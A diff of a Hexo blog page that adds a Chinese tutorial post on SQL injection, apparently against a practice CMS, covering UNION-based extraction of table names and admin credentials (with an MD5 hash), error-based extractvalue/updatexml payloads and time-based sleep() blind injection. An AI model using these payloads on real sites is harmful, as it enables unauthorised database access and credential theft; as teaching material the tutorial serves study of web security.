@@ -6,8 +6,7 @@
     <meta name="referrer" content="origin">
     <meta http-equiv="Cache-Control" content="no-transform">
     <meta http-equiv="Cache-Control" content="no-siteapp">
-    
-    <title>分类</title>
+    <title>SQL注入</title>
 
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/LongCang.css">
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Monda.css">
@@ -18,12 +17,13 @@
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Rosario.css">
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/UbuntuMono.css">
 
-    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/page.css">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/post.css">
     
         <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/normal.css">
     
 
     <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/jquery-3.4.1.min.js"></script>
+
 <meta name="generator" content="Hexo 5.4.0"></head>
 <body>
     <a id="cover"></a>
@@ -31,10 +31,21 @@
     <div class="header">
         <div class="vertical">
             <div class="inner">
-                <h1 class="header-subtitle">分类</h1>
+                <h1 class="header-subtitle">SQL注入</h1>
                 <div class="header-subinfo">
-                    <p class="article-info-text Chinese"></p>
-                    <p class="article-info-text English"></p>                  
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2021-04-24
+                        </span>
+                        
+                            <span id="/2021/04/24/SQL注入/" class="leancloud_visitors" data-flag-title="SQL注入">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/04/24/SQL注入/"></span>
+                        </span>  
+                    </p>                 
                 </div>
             </div>
         </div>
@@ -43,14 +54,132 @@
 </div>
     <div id="container">
     <div id="content">
-        <div class="categories">
-    <div class="categories-title">
-        目前共计 3 个分类
+        <div id="article">
+    <div class="toc"></div>
+    <div class="article-body">
+        <h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><p>御剑扫描网站后台 </p>
+<h2 id="SQL-注入点的判断"><a href="#SQL-注入点的判断" class="headerlink" title="SQL 注入点的判断"></a>SQL 注入点的判断</h2><p>?id=35            +1/-1        有不同反应考虑联合查询</p>
+<p>select * from tbName where id=$id</p>
+<p>?id=35’        字符型，还是数字型</p>
+<p>Near ‘’’ at line 1  报错只含引号的话是数字型，含数字的话是字符型</p>
+<p>select * from tbName where id=’35’’</p>
+<p>?id=35 and 1=1</p>
+<p>?id=35 and 1=2 是否有布尔类型的状态</p>
+<p>seLect * from tbName where id=35 and 1=1 有不同反应说明存在布尔</p>
+<p>seLect * from tbName where id=35 and 1=2 </p>
+<p>Sleep(5）F12看网络 是否有延时</p>
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>由于数据库中的内容会回显到页面中来，所以我们可以采用联合查询进行注入。</p>
+<p>联合查询就是SQL 语法中的union seLect 语句。该语句会同时执行两条select语句，生成两张虚拟表，然后把查询到的结果进行拼接。</p>
+<p>select ~~ union select ~~</p>
+<p>由于虚拟表是二维结构，联合查询会”纵向”拼接，两张虚拟的表。</p>
+<h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h3><p>@ 两张虚拟的表具有相同的列数</p>
+<p>@ 虚拟表对应的列的数据类型相同</p>
+<h3 id="判断字段个数"><a href="#判断字段个数" class="headerlink" title="判断字段个数"></a>判断字段个数</h3><p>可以使用【order by】 语句来判断当前seLect 语句所查询的虚拟表的列数。    【order by】语句本意是按照某一列进行排序，在mysqL中可以使用数字来代替具体的列名，比如【order by 1】就是按照第一列进行排序，如果mysqL没有找到对应的列，就会报错【Unknown column】。我们可以依次增加数字，直到数据库报错。</p>
+<p>可以使用数字来代替具体的列名，比如【order by 1】就是按照第一列进行排序，如果mysql没有找到对应的列，就会报错【Unknown column】。我们可以依次增加数字，直到数据库报错。</p>
+<p>[order by 1 –+]</p>
+<p>[order by 2 –+]</p>
+<p>……</p>
+<p>[order by 15 –+]</p>
+<p>[order by 16–+]</p>
+<p>得到当前虚拟表中字段个数为15。</p>
+<h3 id="判断显示位置"><a href="#判断显示位置" class="headerlink" title="判断显示位置"></a>判断显示位置</h3><p>得到字段个数之后，可以尝试构造联合查询语句。</p>
+<p>这里我们并不知道表名，根据mysql 数据库特性，select语句在执行的过程中，并不需要指定表名。</p>
+<p>[?id=33 union seLect 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15–]</p>
+<p>[?id=33 union select</p>
+<p>null,null,null,null,null,null,null,null,null,null,null,null,null,null,null –+]</p>
+<p>页面显示的是第一张虚拟表的内容，那么我们可以考虑让第一张虚拟表的查询条件为假，则显示第二条记录。因此构造SQL 语句∶</p>
+<p>[?id=33 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 –+]</p>
+<p>[?id=-33 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15–+]</p>
+<p>在执行SQL 语句的时候，可以考虑用火狐浏览器的插件hackbar。</p>
+<p>发现3 和11 会回显到页面中来。</p>
+<h3 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h3><p>我们可以讲数字3 用函数 【version（）】代替，即可得到数据库的版本。</p>
+<p>[?id=33 and 1=2 union select 1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15 -+]</p>
+<p>数据库版本为5.5.53。* 当前数据库名</p>
+<p>[database( )]</p>
+<p>[?id=33 and 1=2 union seLect 1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15 –+]</p>
+<h3 id="数据库中的表"><a href="#数据库中的表" class="headerlink" title="数据库中的表"></a>数据库中的表</h3><p>[?id=33 and 1=2 union select 1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database()–+]</p>
+<p>数据库报错，考虑用 【hex（）】 函数将结果由字符串转化成数字。[?id=33 and 1=2 union select</p>
+<p>1,2,hex(group_concat(table_name)),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database()–+]</p>
+<p>得到十六进制编码后的字符串</p>
+<p>636D735F61727469636C652C636D735F63617465676F72792C636D735F6696C652C636D735F667269656E6 46C696E6B2C636D735F6D6573736167652C636D735F6E6F746963652C636D735F706167652C636D735F7573 657273</p>
+<p>十六进制解码</p>
+<p>cms_articLe,cms_category,cms_fite,cms_friendLink,cms_message,cms_notice,cms_page,cms_us ers</p>
+<p>管理员帐密有可能保存在cms_users 表中。</p>
+<h3 id="表中字段"><a href="#表中字段" class="headerlink" title="表中字段"></a>表中字段</h3><p>[?id=33 and 1=2 union select</p>
+<p>1,2,hex(group_concat(column_name)),4,5,6,7,8,9,10,11,12,13,14,15 from</p>
+<p>information_schema.coLumns where table_schema=database()and table_name=’cmsusers’–+] 7573657269642C757365726E616D652C70617373776F7264</p>
+<p>userid, username, password</p>
+<h3 id="字段内容"><a href="#字段内容" class="headerlink" title="字段内容"></a>字段内容</h3><h4 id="查询表中记录数"><a href="#查询表中记录数" class="headerlink" title="查询表中记录数"></a>查询表中记录数</h4><p>[?id=33 and 1=2 union select 1,2,count(*),4,5,6,7,8,9,10,11,12,13,14,15 from cms_users –+]</p>
+<p>cms_users 表中只有一条记录。查询字段内容</p>
+<p>[?id=33 and 1=2 union select</p>
+<p>1,2,hex(concat(username,:’,password)),4,5,6,7,8,9,10,11,12,13,14,15 from cms_users–+]</p>
+<p>61646D696E3A6531306164633339343962613539616262653536653035376632306638383365</p>
+<p>admin:e10adc3949ba59abbe56e057f20f883e</p>
+<h4 id="查询字段内容"><a href="#查询字段内容" class="headerlink" title="查询字段内容"></a>查询字段内容</h4><p><img src="/image/sql%E6%B3%A8%E5%85%A51.png"><br>得到的是后台管理员帐密，但是密码是以密文的方式保存在数据库中的。通过观察密文可知，此密文为MD5 密文。可以在线查询，网址为cmd5.com<br><img src="/image/sql%E6%B3%A8%E5%85%A52.png"></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在注入点的判断过程中，发现数据库中SQL语句的报错信息，会显示在页面中，因此可以进行报错注入。<br>报错注入的原理，就是在错误信息中执行SQL<br>语句。触发报错的方式很多，具体细节也不尽相同。此处建议直接背公式即可。</p>
+<h3 id="Group-by-重复键冲突"><a href="#Group-by-重复键冲突" class="headerlink" title="Group by 重复键冲突"></a>Group by 重复键冲突</h3><p>[?id=33 and(select 1 from(select count(*),concat((select version()from information_schema.tabLes Limit 0,1),fLoor(rand()*2)×from information_schema.tabLes group by x)a)–+]<br><img src="/image/sql%E6%B3%A8%E5%85%A53.png"><br><img src="/image/sql%E6%B3%A8%E5%85%A54.png"><br><img src="/image/sql%E6%B3%A8%E5%85%A55.png"></p>
+<h3 id="XPATH-报错"><a href="#XPATH-报错" class="headerlink" title="XPATH 报错"></a>XPATH 报错</h3><p>@extractalue( )<br>[?id=33 and extractvalue(1,concat(‘^’,(select version()),’^))–+]<br>@ updatexml()<br>[?id=33 and updatexml(1,concat(‘’,(select database()),),1)–+]</p>
+<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>利用sleep（）语句的延时性，以时间线作为判断条件。</p>
+<h4 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><p>@获取数据库名长度<br>[?id=33 and if((Length(database())=3),sleep(5),1)–+]<br>@ 数据库名第二位<br>[?id=33 and if((ascii(substr(database(),2,1))=109),sleep(5),1)–+]<br>由此可知，数据库名第二个字母的ASCII 码值为109，即是字母m。</p>
+
+        <p class="suffix-end">__END__</p>
+        <div class="suffix-box">
+            <div class="suffix-box-left">
+                <img src="/image/touxiang.jpg" alt="moss">
+            </div>
+            <div class="suffix-box-right">
+                <span class="suffix-box-title">文章作者</span>：moss
+                <br>
+                <span class="suffix-box-title">文章出处</span>：<a href="/2021/04/24/SQL%E6%B3%A8%E5%85%A5/" target="_blank">SQL注入</a>
+                <br>
+                <span class="suffix-box-title">作者签名</span>：简单地活着, 肆意又精彩.
+                <br>
+                <span class="suffix-box-title">关于主题</span>：<a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+                <br>
+                <span class="suffix-box-title">版权声明</span>：文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+                <br>
+            </div>
+            <div style="clear: both;"></div>
+        </div>
     </div>
-    <div class="categories-content">
-        <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/category/WP-ctfshow/">-WP -ctfshow</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/category/markdown%E8%AF%AD%E6%B3%95/">-markdown语法</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/category/web%E5%AE%89%E5%85%A8-sql%E6%B3%A8%E5%85%A5/">-web安全 -sql注入</a><span class="category-list-count">3</span></li></ul>
+    <div class="article-footer">
+        
+            <div class="category">
+                分类：
+                
+                    <a href="/category/web%E5%AE%89%E5%85%A8-sql%E6%B3%A8%E5%85%A5/">-web安全 -sql注入</a>
+                
+            </div>
+        
+        
+            <div class="tag">
+                标签：
+                
+                    <a href="/tag/sql/">-sql</a>
+                
+            </div>
+        
+        <div class="article-prev-next">
+            
+                <a href="/2021/04/24/sqlmap/" class="prev-prefix">« </a> 上一篇：    <a href="/2021/04/24/sqlmap/" title="发布于 2021-04-24 09:28">sqlmap</a>
+                <br>
+            
+            
+                <a href="/2021/04/23/ctfshow-web%E5%85%A5%E9%97%A8/" class="next-prefix">» </a> 下一篇：    <a href="/2021/04/23/ctfshow-web%E5%85%A5%E9%97%A8/" title="发布于 2021-04-23 04:38">ctfshow-web入门</a>
+            
+        </div>
     </div>
+    
+    <div class="article-comments">
+        <div class="comments-title">
+            评论列表
+        </div>
+        <div class="comments-content">
+        </div>
+    </div>
+
 </div>
+
     </div>
 </div>
     <div id="footer"></div>
